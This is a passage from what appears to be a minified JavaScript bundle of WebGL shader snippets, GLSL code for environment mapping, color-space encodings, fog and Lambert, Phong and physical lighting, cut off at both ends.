= vec2(0.0+mipOffset,0.5 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\n\t}\n\telse if( face == 4) {\n\t\tr = vec3(direction.y, direction.x, -direction.z);\n\t\toffset = vec2(scale+mipOffset, 0.5 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\n\t}\n\telse {\n\t\tr = vec3(direction.z, -direction.x, direction.y);\n\t\toffset = vec2(2.0*scale+mipOffset, 0.5 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\n\t}\n\tr = normalize(r);\n\tfloat texelOffset = 0.5 * cubeUV_rcpTextureSize;\n\tvec2 s = ( r.yz / abs( r.x ) + vec2( 1.0 ) ) * 0.5;\n\tvec2 base = offset + vec2( texelOffset );\n\treturn base + s * ( scale - 2.0 * texelOffset );\n}\n#define cubeUV_maxLods3 (log2(cubeUV_textureSize*0.25) - 3.0)\nvec4 textureCubeUV( sampler2D envMap, vec3 reflectedDirection, float roughness ) {\n\tfloat roughnessVal = roughness* cubeUV_maxLods3;\n\tfloat r1 = floor(roughnessVal);\n\tfloat r2 = r1 + 1.0;\n\tfloat t = fract(roughnessVal);\n\tvec2 mipInfo = MipLevelInfo(reflectedDirection, r1, roughness);\n\tfloat s = mipInfo.y;\n\tfloat level0 = mipInfo.x;\n\tfloat level1 = level0 + 1.0;\n\tlevel1 = level1 > 5.0 ? 5.0 : level1;\n\tlevel0 += min( floor( s + 0.5 ), 5.0 );\n\tvec2 uv_10 = getCubeUV(reflectedDirection, r1, level0);\n\tvec4 color10 = envMapTexelToLinear(texture2D(envMap, uv_10));\n\tvec2 uv_20 = getCubeUV(reflectedDirection, r2, level0);\n\tvec4 color20 = envMapTexelToLinear(texture2D(envMap, uv_20));\n\tvec4 result = mix(color10, color20, t);\n\treturn vec4(result.rgb, 1.0);\n}\n#endif",defaultnormal_vertex:"vec3 transformedNormal = objectNormal;\n#ifdef USE_INSTANCING\n\ttransformedNormal = mat3( instanceMatrix ) * transformedNormal;\n#endif\ntransformedNormal = normalMatrix * transformedNormal;\n#ifdef FLIP_SIDED\n\ttransformedNormal = - transformedNormal;\n#endif\n#ifdef USE_TANGENT\n\tvec3 transformedTangent = normalMatrix * objectTangent;\n\t#ifdef FLIP_SIDED\n\t\ttransformedTangent = - transformedTangent;\n\t#endif\n#endif",displacementmap_pars_vertex:"#ifdef USE_DISPLACEMENTMAP\n\tuniform sampler2D displacementMap;\n\tuniform float displacementScale;\n\tuniform float displacementBias;\n#endif",displacementmap_vertex:"#ifdef USE_DISPLACEMENTMAP\n\ttransformed += normalize( objectNormal ) * ( texture2D( displacementMap, vUv ).x * displacementScale + displacementBias );\n#endif",emissivemap_fragment:"#ifdef USE_EMISSIVEMAP\n\tvec4 emissiveColor = texture2D( emissiveMap, vUv );\n\temissiveColor.rgb = emissiveMapTexelToLinear( emissiveColor ).rgb;\n\ttotalEmissiveRadiance *= emissiveColor.rgb;\n#endif",emissivemap_pars_fragment:"#ifdef USE_EMISSIVEMAP\n\tuniform sampler2D emissiveMap;\n#endif",encodings_fragment:"gl_FragColor = linearToOutputTexel( gl_FragColor );",encodings_pars_fragment:"\nvec4 LinearToLinear( in vec4 value ) {\n\treturn value;\n}\nvec4 GammaToLinear( in vec4 value, in float gammaFactor ) {\n\treturn vec4( pow( value.rgb, vec3( gammaFactor ) ), value.a );\n}\nvec4 LinearToGamma( in vec4 value, in float gammaFactor ) {\n\treturn vec4( pow( value.rgb, vec3( 1.0 / gammaFactor ) ), value.a );\n}\nvec4 sRGBToLinear( in vec4 value ) {\n\treturn vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.a );\n}\nvec4 LinearTosRGB( in vec4 value ) {\n\treturn vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.a );\n}\nvec4 RGBEToLinear( in vec4 value ) {\n\treturn vec4( value.rgb * exp2( value.a * 255.0 - 128.0 ), 1.0 );\n}\nvec4 LinearToRGBE( in vec4 value ) {\n\tfloat maxComponent = max( max( value.r, value.g ), value.b );\n\tfloat fExp = clamp( ceil( log2( maxComponent ) ), -128.0, 127.0 );\n\treturn vec4( value.rgb / exp2( fExp ), ( fExp + 128.0 ) / 255.0 );\n}\nvec4 RGBMToLinear( in vec4 value, in float maxRange ) {\n\treturn vec4( value.rgb * value.a * maxRange, 1.0 );\n}\nvec4 LinearToRGBM( in vec4 value, in float maxRange ) {\n\tfloat maxRGB = max( value.r, max( value.g, value.b ) );\n\tfloat M = clamp( maxRGB / maxRange, 0.0, 1.0 );\n\tM = ceil( M * 255.0 ) / 255.0;\n\treturn vec4( value.rgb / ( M * maxRange ), M );\n}\nvec4 RGBDToLinear( in vec4 value, in float maxRange ) {\n\treturn vec4( value.rgb * ( ( maxRange / 255.0 ) / value.a ), 1.0 );\n}\nvec4 LinearToRGBD( in vec4 value, in float maxRange ) {\n\tfloat maxRGB = max( value.r, max( value.g, value.b ) );\n\tfloat D = max( maxRange / maxRGB, 1.0 );\n\tD = min( floor( D ) / 255.0, 1.0 );\n\treturn vec4( value.rgb * ( D * ( 255.0 / maxRange ) ), D );\n}\nconst mat3 cLogLuvM = mat3( 0.2209, 0.3390, 0.4184, 0.1138, 0.6780, 0.7319, 0.0102, 0.1130, 0.2969 );\nvec4 LinearToLogLuv( in vec4 value )  {\n\tvec3 Xp_Y_XYZp = cLogLuvM * value.rgb;\n\tXp_Y_XYZp = max( Xp_Y_XYZp, vec3( 1e-6, 1e-6, 1e-6 ) );\n\tvec4 vResult;\n\tvResult.xy = Xp_Y_XYZp.xy / Xp_Y_XYZp.z;\n\tfloat Le = 2.0 * log2(Xp_Y_XYZp.y) + 127.0;\n\tvResult.w = fract( Le );\n\tvResult.z = ( Le - ( floor( vResult.w * 255.0 ) ) / 255.0 ) / 255.0;\n\treturn vResult;\n}\nconst mat3 cLogLuvInverseM = mat3( 6.0014, -2.7008, -1.7996, -1.3320, 3.1029, -5.7721, 0.3008, -1.0882, 5.6268 );\nvec4 LogLuvToLinear( in vec4 value ) {\n\tfloat Le = value.z * 255.0 + value.w;\n\tvec3 Xp_Y_XYZp;\n\tXp_Y_XYZp.y = exp2( ( Le - 127.0 ) / 2.0 );\n\tXp_Y_XYZp.z = Xp_Y_XYZp.y / value.y;\n\tXp_Y_XYZp.x = value.x * Xp_Y_XYZp.z;\n\tvec3 vRGB = cLogLuvInverseM * Xp_Y_XYZp.rgb;\n\treturn vec4( max( vRGB, 0.0 ), 1.0 );\n}",envmap_fragment:"#ifdef USE_ENVMAP\n\t#ifdef ENV_WORLDPOS\n\t\tvec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );\n\t\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t\tvec3 reflectVec = reflect( cameraToVertex, worldNormal );\n\t\t#else\n\t\t\tvec3 reflectVec = refract( cameraToVertex, worldNormal, refractionRatio );\n\t\t#endif\n\t#else\n\t\tvec3 reflectVec = vReflect;\n\t#endif\n\t#ifdef ENVMAP_TYPE_CUBE\n\t\tvec4 envColor = textureCube( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\n\t#elif defined( ENVMAP_TYPE_EQUIREC )\n\t\tvec2 sampleUV;\n\t\treflectVec = normalize( reflectVec );\n\t\tsampleUV.y = asin( clamp( reflectVec.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\n\t\tsampleUV.x = atan( reflectVec.z, reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\n\t\tvec4 envColor = texture2D( envMap, sampleUV );\n\t#elif defined( ENVMAP_TYPE_SPHERE )\n\t\treflectVec = normalize( reflectVec );\n\t\tvec3 reflectView = normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0, 0.0, 1.0 ) );\n\t\tvec4 envColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5 );\n\t#else\n\t\tvec4 envColor = vec4( 0.0 );\n\t#endif\n\tenvColor = envMapTexelToLinear( envColor );\n\t#ifdef ENVMAP_BLENDING_MULTIPLY\n\t\toutgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\n\t#elif defined( ENVMAP_BLENDING_MIX )\n\t\toutgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\n\t#elif defined( ENVMAP_BLENDING_ADD )\n\t\toutgoingLight += envColor.xyz * specularStrength * reflectivity;\n\t#endif\n#endif",envmap_common_pars_fragment:"#ifdef USE_ENVMAP\n\tuniform float envMapIntensity;\n\tuniform float flipEnvMap;\n\tuniform int maxMipLevel;\n\t#ifdef ENVMAP_TYPE_CUBE\n\t\tuniform samplerCube envMap;\n\t#else\n\t\tuniform sampler2D envMap;\n\t#endif\n\t\n#endif",envmap_pars_fragment:"#ifdef USE_ENVMAP\n\tuniform float reflectivity;\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\n\t\t#define ENV_WORLDPOS\n\t#endif\n\t#ifdef ENV_WORLDPOS\n\t\tvarying vec3 vWorldPosition;\n\t\tuniform float refractionRatio;\n\t#else\n\t\tvarying vec3 vReflect;\n\t#endif\n#endif",envmap_pars_vertex:"#ifdef USE_ENVMAP\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) ||defined( PHONG )\n\t\t#define ENV_WORLDPOS\n\t#endif\n\t#ifdef ENV_WORLDPOS\n\t\t\n\t\tvarying vec3 vWorldPosition;\n\t#else\n\t\tvarying vec3 vReflect;\n\t\tuniform float refractionRatio;\n\t#endif\n#endif",envmap_physical_pars_fragment:"#if defined( USE_ENVMAP )\n\t#ifdef ENVMAP_MODE_REFRACTION\n\t\tuniform float refractionRatio;\n\t#endif\n\tvec3 getLightProbeIndirectIrradiance( const in GeometricContext geometry, const in int maxMIPLevel ) {\n\t\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\n\t\t#ifdef ENVMAP_TYPE_CUBE\n\t\t\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\t\t\t\tvec4 envMapColor = textureCubeLodEXT( envMap, queryVec, float( maxMIPLevel ) );\n\t\t\t#else\n\t\t\t\tvec4 envMapColor = textureCube( envMap, queryVec, float( maxMIPLevel ) );\n\t\t\t#endif\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\t\t#elif defined( ENVMAP_TYPE_CUBE_UV )\n\t\t\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\n\t\t\tvec4 envMapColor = textureCubeUV( envMap, queryVec, 1.0 );\n\t\t#else\n\t\t\tvec4 envMapColor = vec4( 0.0 );\n\t\t#endif\n\t\treturn PI * envMapColor.rgb * envMapIntensity;\n\t}\n\tfloat getSpecularMIPLevel( const in float roughness, const in int maxMIPLevel ) {\n\t\tfloat maxMIPLevelScalar = float( maxMIPLevel );\n\t\tfloat sigma = PI * roughness * roughness / ( 1.0 + roughness );\n\t\tfloat desiredMIPLevel = maxMIPLevelScalar + log2( sigma );\n\t\treturn clamp( desiredMIPLevel, 0.0, maxMIPLevelScalar );\n\t}\n\tvec3 getLightProbeIndirectRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness, const in int maxMIPLevel ) {\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t  vec3 reflectVec = reflect( -viewDir, normal );\n\t\t  reflectVec = normalize( mix( reflectVec, normal, roughness * roughness) );\n\t\t#else\n\t\t  vec3 reflectVec = refract( -viewDir, normal, refractionRatio );\n\t\t#endif\n\t\treflectVec = inverseTransformDirection( reflectVec, viewMatrix );\n\t\tfloat specularMIPLevel = getSpecularMIPLevel( roughness, maxMIPLevel );\n\t\t#ifdef ENVMAP_TYPE_CUBE\n\t\t\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\t\t\t\tvec4 envMapColor = textureCubeLodEXT( envMap, queryReflectVec, specularMIPLevel );\n\t\t\t#else\n\t\t\t\tvec4 envMapColor = textureCube( envMap, queryReflectVec, specularMIPLevel );\n\t\t\t#endif\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\t\t#elif defined( ENVMAP_TYPE_CUBE_UV )\n\t\t\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\n\t\t\tvec4 envMapColor = textureCubeUV( envMap, queryReflectVec, roughness );\n\t\t#elif defined( ENVMAP_TYPE_EQUIREC )\n\t\t\tvec2 sampleUV;\n\t\t\tsampleUV.y = asin( clamp( reflectVec.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\n\t\t\tsampleUV.x = atan( reflectVec.z, reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\t\t\t\tvec4 envMapColor = texture2DLodEXT( envMap, sampleUV, specularMIPLevel );\n\t\t\t#else\n\t\t\t\tvec4 envMapColor = texture2D( envMap, sampleUV, specularMIPLevel );\n\t\t\t#endif\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\t\t#elif defined( ENVMAP_TYPE_SPHERE )\n\t\t\tvec3 reflectView = normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0,0.0,1.0 ) );\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\t\t\t\tvec4 envMapColor = texture2DLodEXT( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\n\t\t\t#else\n\t\t\t\tvec4 envMapColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\n\t\t\t#endif\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\t\t#endif\n\t\treturn envMapColor.rgb * envMapIntensity;\n\t}\n#endif",envmap_vertex:"#ifdef USE_ENVMAP\n\t#ifdef ENV_WORLDPOS\n\t\tvWorldPosition = worldPosition.xyz;\n\t#else\n\t\tvec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );\n\t\tvec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t\tvReflect = reflect( cameraToVertex, worldNormal );\n\t\t#else\n\t\t\tvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\n\t\t#endif\n\t#endif\n#endif",fog_vertex:"#ifdef USE_FOG\n\tfogDepth = -mvPosition.z;\n#endif",fog_pars_vertex:"#ifdef USE_FOG\n\tvarying float fogDepth;\n#endif",fog_fragment:"#ifdef USE_FOG\n\t#ifdef FOG_EXP2\n\t\tfloat fogFactor = 1.0 - exp( - fogDensity * fogDensity * fogDepth * fogDepth );\n\t#else\n\t\tfloat fogFactor = smoothstep( fogNear, fogFar, fogDepth );\n\t#endif\n\tgl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );\n#endif",fog_pars_fragment:"#ifdef USE_FOG\n\tuniform vec3 fogColor;\n\tvarying float fogDepth;\n\t#ifdef FOG_EXP2\n\t\tuniform float fogDensity;\n\t#else\n\t\tuniform float fogNear;\n\t\tuniform float fogFar;\n\t#endif\n#endif",gradientmap_pars_fragment:"#ifdef TOON\n\tuniform sampler2D gradientMap;\n\tvec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {\n\t\tfloat dotNL = dot( normal, lightDirection );\n\t\tvec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );\n\t\t#ifdef USE_GRADIENTMAP\n\t\t\treturn texture2D( gradientMap, coord ).rgb;\n\t\t#else\n\t\t\treturn ( coord.x < 0.7 ) ? vec3( 0.7 ) : vec3( 1.0 );\n\t\t#endif\n\t}\n#endif",lightmap_fragment:"#ifdef USE_LIGHTMAP\n\treflectedLight.indirectDiffuse += PI * texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\n#endif",lightmap_pars_fragment:"#ifdef USE_LIGHTMAP\n\tuniform sampler2D lightMap;\n\tuniform float lightMapIntensity;\n#endif",lights_lambert_vertex:"vec3 diffuse = vec3( 1.0 );\nGeometricContext geometry;\ngeometry.position = mvPosition.xyz;\ngeometry.normal = normalize( transformedNormal );\ngeometry.viewDir = normalize( -mvPosition.xyz );\nGeometricContext backGeometry;\nbackGeometry.position = geometry.position;\nbackGeometry.normal = -geometry.normal;\nbackGeometry.viewDir = geometry.viewDir;\nvLightFront = vec3( 0.0 );\nvIndirectFront = vec3( 0.0 );\n#ifdef DOUBLE_SIDED\n\tvLightBack = vec3( 0.0 );\n\tvIndirectBack = vec3( 0.0 );\n#endif\nIncidentLight directLight;\nfloat dotNL;\nvec3 directLightColor_Diffuse;\n#if NUM_POINT_LIGHTS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\t\tgetPointDirectLightIrradiance( pointLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n#endif\n#if NUM_SPOT_LIGHTS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\t\tgetSpotDirectLightIrradiance( spotLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n#endif\n#if NUM_DIR_LIGHTS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\t\tgetDirectionalDirectLightIrradiance( directionalLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n#endif\n#if NUM_HEMI_LIGHTS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\n\t\tvIndirectFront += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvIndirectBack += getHemisphereLightIrradiance( hemisphereLights[ i ], backGeometry );\n\t\t#endif\n\t}\n#endif",lights_pars_begin:"uniform bool receiveShadow;\nuniform vec3 ambientLightColor;\nuniform vec3 lightProbe[ 9 ];\nvec3 shGetIrradianceAt( in vec3 normal, in vec3 shCoefficients[ 9 ] ) {\n\tfloat x = normal.x, y = normal.y, z = normal.z;\n\tvec3 result = shCoefficients[ 0 ] * 0.886227;\n\tresult += shCoefficients[ 1 ] * 2.0 * 0.511664 * y;\n\tresult += shCoefficients[ 2 ] * 2.0 * 0.511664 * z;\n\tresult += shCoefficients[ 3 ] * 2.0 * 0.511664 * x;\n\tresult += shCoefficients[ 4 ] * 2.0 * 0.429043 * x * y;\n\tresult += shCoefficients[ 5 ] * 2.0 * 0.429043 * y * z;\n\tresult += shCoefficients[ 6 ] * ( 0.743125 * z * z - 0.247708 );\n\tresult += shCoefficients[ 7 ] * 2.0 * 0.429043 * x * z;\n\tresult += shCoefficients[ 8 ] * 0.429043 * ( x * x - y * y );\n\treturn result;\n}\nvec3 getLightProbeIrradiance( const in vec3 lightProbe[ 9 ], const in GeometricContext geometry ) {\n\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\n\tvec3 irradiance = shGetIrradianceAt( worldNormal, lightProbe );\n\treturn irradiance;\n}\nvec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {\n\tvec3 irradiance = ambientLightColor;\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\treturn irradiance;\n}\n#if NUM_DIR_LIGHTS > 0\n\tstruct DirectionalLight {\n\t\tvec3 direction;\n\t\tvec3 color;\n\t\tint shadow;\n\t\tfloat shadowBias;\n\t\tfloat shadowRadius;\n\t\tvec2 shadowMapSize;\n\t};\n\tuniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];\n\tvoid getDirectionalDirectLightIrradiance( const in DirectionalLight directionalLight, const in GeometricContext geometry, out IncidentLight directLight ) {\n\t\tdirectLight.color = directionalLight.color;\n\t\tdirectLight.direction = directionalLight.direction;\n\t\tdirectLight.visible = true;\n\t}\n#endif\n#if NUM_POINT_LIGHTS > 0\n\tstruct PointLight {\n\t\tvec3 position;\n\t\tvec3 color;\n\t\tfloat distance;\n\t\tfloat decay;\n\t\tint shadow;\n\t\tfloat shadowBias;\n\t\tfloat shadowRadius;\n\t\tvec2 shadowMapSize;\n\t\tfloat shadowCameraNear;\n\t\tfloat shadowCameraFar;\n\t};\n\tuniform PointLight pointLights[ NUM_POINT_LIGHTS ];\n\tvoid getPointDirectLightIrradiance( const in PointLight pointLight, const in GeometricContext geometry, out IncidentLight directLight ) {\n\t\tvec3 lVector = pointLight.position - geometry.position;\n\t\tdirectLight.direction = normalize( lVector );\n\t\tfloat lightDistance = length( lVector );\n\t\tdirectLight.color = pointLight.color;\n\t\tdirectLight.color *= punctualLightIntensityToIrradianceFactor( lightDistance, pointLight.distance, pointLight.decay );\n\t\tdirectLight.visible = ( directLight.color != vec3( 0.0 ) );\n\t}\n#endif\n#if NUM_SPOT_LIGHTS > 0\n\tstruct SpotLight {\n\t\tvec3 position;\n\t\tvec3 direction;\n\t\tvec3 color;\n\t\tfloat distance;\n\t\tfloat decay;\n\t\tfloat coneCos;\n\t\tfloat penumbraCos;\n\t\tint shadow;\n\t\tfloat shadowBias;\n\t\tfloat shadowRadius;\n\t\tvec2 shadowMapSize;\n\t};\n\tuniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];\n\tvoid getSpotDirectLightIrradiance( const in SpotLight spotLight, const in GeometricContext geometry, out IncidentLight directLight  ) {\n\t\tvec3 lVector = spotLight.position - geometry.position;\n\t\tdirectLight.direction = normalize( lVector );\n\t\tfloat lightDistance = length( lVector );\n\t\tfloat angleCos = dot( directLight.direction, spotLight.direction );\n\t\tif ( angleCos > spotLight.coneCos ) {\n\t\t\tfloat spotEffect = smoothstep( spotLight.coneCos, spotLight.penumbraCos, angleCos );\n\t\t\tdirectLight.color = spotLight.color;\n\t\t\tdirectLight.color *= spotEffect * punctualLightIntensityToIrradianceFactor( lightDistance, spotLight.distance, spotLight.decay );\n\t\t\tdirectLight.visible = true;\n\t\t} else {\n\t\t\tdirectLight.color = vec3( 0.0 );\n\t\t\tdirectLight.visible = false;\n\t\t}\n\t}\n#endif\n#if NUM_RECT_AREA_LIGHTS > 0\n\tstruct RectAreaLight {\n\t\tvec3 color;\n\t\tvec3 position;\n\t\tvec3 halfWidth;\n\t\tvec3 halfHeight;\n\t};\n\tuniform sampler2D ltc_1;\tuniform sampler2D ltc_2;\n\tuniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];\n#endif\n#if NUM_HEMI_LIGHTS > 0\n\tstruct HemisphereLight {\n\t\tvec3 direction;\n\t\tvec3 skyColor;\n\t\tvec3 groundColor;\n\t};\n\tuniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];\n\tvec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in GeometricContext geometry ) {\n\t\tfloat dotNL = dot( geometry.normal, hemiLight.direction );\n\t\tfloat hemiDiffuseWeight = 0.5 * dotNL + 0.5;\n\t\tvec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\t\tirradiance *= PI;\n\t\t#endif\n\t\treturn irradiance;\n\t}\n#endif",lights_phong_fragment:"BlinnPhongMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb;\nmaterial.specularColor = specular;\nmaterial.specularShininess = shininess;\nmaterial.specularStrength = specularStrength;",lights_phong_pars_fragment:"varying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\nstruct BlinnPhongMaterial {\n\tvec3\tdiffuseColor;\n\tvec3\tspecularColor;\n\tfloat\tspecularShininess;\n\tfloat\tspecularStrength;\n};\nvoid RE_Direct_BlinnPhong( const in IncidentLight directLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\n\t#ifdef TOON\n\t\tvec3 irradiance = getGradientIrradiance( geometry.normal, directLight.direction ) * directLight.color;\n\t#else\n\t\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\n\t\tvec3 irradiance = dotNL * directLight.color;\n\t#endif\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n\treflectedLight.directSpecular += irradiance * BRDF_Specular_BlinnPhong( directLight, geometry, material.specularColor, material.specularShininess ) * material.specularStrength;\n}\nvoid RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\n#define RE_Direct\t\t\t\tRE_Direct_BlinnPhong\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_BlinnPhong\n#define Material_LightProbeLOD( material )\t(0)",lights_physical_fragment:"PhysicalMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );\nmaterial.specularRoughness = clamp( roughnessFactor, 0.04, 1.0 );\n#ifdef REFLECTIVITY\n\tmaterial.specularColor = mix( vec3( MAXIMUM_SPECULAR_COEFFICIENT * pow2( reflectivity ) ), diffuseColor.rgb, metalnessFactor );\n#else\n\tmaterial.specularColor = mix( vec3( DEFAULT_SPECULAR_COEFFICIENT ), diffuseColor.rgb, metalnessFactor );\n#endif\n#ifdef CLEARCOAT\n\tmaterial.clearcoat = saturate( clearcoat );\tmaterial.clearcoatRoughness = clamp( clearcoatRoughness, 0.04, 1.0 );\n#endif\n#ifdef USE_SHEEN\n\tmaterial.sheenColor = sheen;\n#endif",lights_physical_pars_fragment:"struct PhysicalMaterial {\n\tvec3\tdiffuseColor;\n\tfloat\tspecularRoughness;\n\tvec3\tspecularColor;\n#ifdef CLEARCOAT\n\tfloat clearcoat;\n\tfloat clearcoatRoughness;\n#endif\n#ifdef USE_SHEEN\n\tvec3 sheenColor;\n#endif\n};\n#define MAXIMUM_SPECULAR_COEFFICIENT 0.16\n#define DEFAULT_SPECULAR_COEFFICIENT 0.04\nfloat clearcoatDHRApprox( const in float roughness, const in float dotNL ) {\n\treturn DEFAULT_SPECULAR_COEFFICIENT + ( 1.0 - DEFAULT_SPECULAR_COEFFICIENT ) * ( pow( 1.0 - dotNL, 5.0 ) * pow( 1.0 - roughness, 2.0 ) );\n}\n#if NUM_RECT_AREA_LIGHTS > 0\n\tvoid RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\t\tvec3 normal = geometry.normal;\n\t\tvec3 viewDir = geometry.viewDir;\n\t\tvec3 position = geometry.position;\n\t\tvec3 lightPos = rectAreaLight.position;\n\t\tvec3 halfWidth = rectAreaLight.halfWidth;\n\t\tvec3 halfHeight = rectAreaLight.halfHeight;\n\t\tvec3 lightColor = rectAreaLight.color;\n\t\tfloat roughness = material.specularRoughness;\n\t\tvec3 rectCoords[ 4 ];\n\t\trectCoords[ 0 ] = lightPos + halfWidth - halfHeight;\t\trectCoords[ 1 ] = lightPos - halfWidth - halfHeight;\n\t\trectCoords[ 2 ] = lightPos - halfWidth + halfHeight;\n\t\trectCoords[ 3 ] = lightPos + halfWidth + halfHeight;\n\t\tvec2 uv = LTC_Uv( normal, viewDir, roughness );\n\t\tvec4 t1 = texture2D( ltc_1, uv );\n\t\tvec4 t2 = texture2D( ltc_2, uv );\n\t\tmat3 mInv = mat3(\n\t\t\tvec3( t1.x, 0, t1.y ),\n\t\t\tvec3(    0, 1,    0 ),\n\t\t\tvec3( t1.z, 0, t1.w )\n\t\t);\n\t\tvec3 fresnel = ( material.specularColor * t2.x + ( vec3( 1.0 ) - material.specularColor ) * t2.y );\n\t\treflectedLight.directSpecular += lightColor * fresnel * LTC_Evaluate( normal, viewDir, position, mInv, rectCoords );\n\t\treflectedLight.directDiffuse += lightColor * material.diffuseColor * LTC_Evaluate( normal, viewDir, position, mat3( 1.0 ), rectCoords );\n\t}\n#endif\nvoid RE_Direct_Physical( const in IncidentLight directLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\tfloat dotNL = saturate( dot( 